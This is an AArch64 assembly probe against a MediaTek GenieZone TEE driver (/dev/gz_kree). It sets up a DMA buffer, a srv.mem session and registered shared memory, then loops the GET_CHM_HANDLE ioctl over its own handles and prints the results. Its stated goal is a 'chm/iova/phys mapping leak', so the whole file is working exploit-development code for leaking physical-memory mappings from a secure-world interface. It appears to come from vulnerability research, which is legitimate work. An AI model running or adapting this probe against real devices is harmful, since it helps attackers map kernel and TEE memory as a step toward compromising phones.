/* kree_getchm.S -- GetChmHandle over our OWN objects (shm, dbfd, sess).
 * Setup: open + dma + create(srv.mem) + register -> shm handle in w26.
 * Then MTEE_CMD_GET_CHM_HANDLE(0xc0085416) struct{0,X} for X in
 * {shm, dbfd, sess, 0}. Print rc+out each. Goal: chm/iova/phys mapping leak
 * (the read direction). No flash/reboot.
 */
    .arch armv8-a
    .text
    .global _start
    .equ SYS_OPENAT, 56
    .equ SYS_IOCTL, 29
    .equ SYS_WRITE, 64
    .equ SYS_MMAP, 222
    .equ SYS_EXIT, 93
    .section .rodata
dev_path:   .asciz "/dev/gz_kree"
heap_path:  .asciz "/dev/dma_heap/system"
msg_rc:     .asciz " rc=0x"
msg_out:    .asciz " out=0x"
msg_nl:     .asciz "\n"
svc_mem:    .asciz "com.mediatek.geniezone.srv.mem"
    .text
print:
    mov x2, x1; mov x1, x0; mov x0, #1; mov x8, #SYS_WRITE; svc #0; ret
print_cstr:
    mov x2, x0; mov x3, #0
1:  ldrb w1, [x2, x3]; cbz w1, 2f; add x3, x3, #1; b 1b
2:  mov x1, x3; b print
print_hex32:
    stp x29, x30, [sp, #-16]!
    mov x29, sp; sub sp, sp, #16; mov w1, w0; add x2, sp, #8; mov w3, #8
1:  sub x2, x2, #1; and w4, w1, #0xf; lsr w1, w1, #4; cmp w4, #10
    add w5, w4, #48; add w6, w4, #87; csel w4, w5, w6, lo; strb w4, [x2]
    subs w3, w3, #1; b.ne 1b
    mov x0, sp; mov x1, #8; bl print
    add sp, sp, #16; ldp x29, x30, [sp], #16; ret
// w20=which, w21=rc, w22=out
report:
    stp x29, x30, [sp, #-16]!
    mov x29, sp; mov w10, w20; mov w11, w21; mov w12, w22
    adrp x0, msg_rc; add x0, x0, :lo12:msg_rc; bl print_cstr
    mov w0, w10; bl print_hex32
    mov w0, w11; bl print_hex32
    adrp x0, msg_out; add x0, x0, :lo12:msg_out; bl print_cstr
    mov w0, w12; bl print_hex32
    adrp x0, msg_nl; add x0, x0, :lo12:msg_nl; mov x1, #1; bl print
    ldp x29, x30, [sp], #16; ret
_start:
    movn x0, #99
    adrp x1, dev_path; add x1, x1, :lo12:dev_path
    mov x2, #2; mov x3, xzr; mov x8, #SYS_OPENAT; svc #0
    mov x19, x0
    cmp x19, #0; b.lt done
    // dma 4KB -> x26, dbfd -> x25
    movn x0, #99
    adrp x1, heap_path; add x1, x1, :lo12:heap_path
    mov x2, #2; mov x3, xzr; mov x8, #SYS_OPENAT; svc #0
    mov x24, x0
    sub sp, sp, #32
    mov x0, #0x1000; str x0, [sp]; str wzr, [sp, #8]
    mov w0, #2; movk w0, #0x8, lsl #16; str w0, [sp, #12]; str xzr, [sp, #16]
    mov x0, x24; mov w1, #0x4800; movk w1, #0xc018, lsl #16
    mov x2, sp; mov x8, #SYS_IOCTL; svc #0
    ldr w25, [sp, #8]
    mov x0, xzr; mov x1, #0x1000; mov x2, #3; mov x3, #1
    mov x4, x25; mov x5, xzr; mov x8, #SYS_MMAP; svc #0
    mov x26, x0
    add sp, sp, #32
    // create(srv.mem) -> w28
    sub sp, sp, #32
    str xzr, [sp]
    adrp x0, svc_mem; add x0, x0, :lo12:svc_mem
    str x0, [sp, #8]
    mov x0, x19
    mov w1, #0x5401; movk w1, #0xc010, lsl #16
    mov x2, sp; mov x8, #SYS_IOCTL; svc #0
    ldr w28, [sp, #4]
    add sp, sp, #32
    cbz w28, done
    // register dma -> w29 shm
    sub sp, sp, #32
    str w28, [sp]
    str wzr, [sp, #4]
    str x26, [sp, #8]
    mov x0, #0x1000; str x0, [sp, #16]
    str xzr, [sp, #24]
    mov x0, x19
    mov w1, #0x5404; movk w1, #0xc020, lsl #16
    mov x2, sp; mov x8, #SYS_IOCTL; svc #0
    ldr w29, [sp, #4]
    add sp, sp, #32
    cbz w29, done              // no shm, nothing to convert
    // GetChm over {shm, dbfd, sess, 0} (w20 = which 0..3)
    mov w20, #0
gc_loop:
    cmp w20, #0; b.ne 1f
    mov w0, w29; b 2f          // X = shm
1:  cmp w20, #1; b.ne 3f
    mov w0, w25; b 2f          // X = dbfd
3:  cmp w20, #2; b.ne 4f
    mov w0, w28; b 2f          // X = sess
4:  mov w0, wzr                // X = 0
2:
    sub sp, sp, #16
    str xzr, [sp]
    str w0, [sp, #4]
    mov x0, x19
    mov w1, #0x5416; movk w1, #0xc008, lsl #16
    mov x2, sp; mov x8, #SYS_IOCTL; svc #0
    mov x21, x0
    ldr w22, [sp, #4]
    add sp, sp, #16
    bl report
    add w20, w20, #1
    cmp w20, #4
    b.lt gc_loop
done:
    mov x0, #0; mov x8, #SYS_EXIT; svc #0
